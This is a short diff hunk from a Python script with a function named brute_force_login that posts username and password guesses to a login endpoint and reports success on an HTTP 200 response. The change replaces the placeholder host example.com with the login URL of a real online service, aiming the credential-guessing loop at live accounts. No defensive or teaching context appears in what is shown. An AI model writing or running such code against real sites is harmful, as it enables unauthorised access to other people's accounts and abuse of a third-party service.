@@ -13,7 +13,7 @@ def brute_force_login(username):
                 "username": username,
                 "password": password
             }
-            response = requests.post("https://example.com/login", data=login_data)
+            response = requests.post("https://create.kahoot.it/auth/login", data=login_data)
 
             if response.status_code == 200:
                 print("Login successful!")
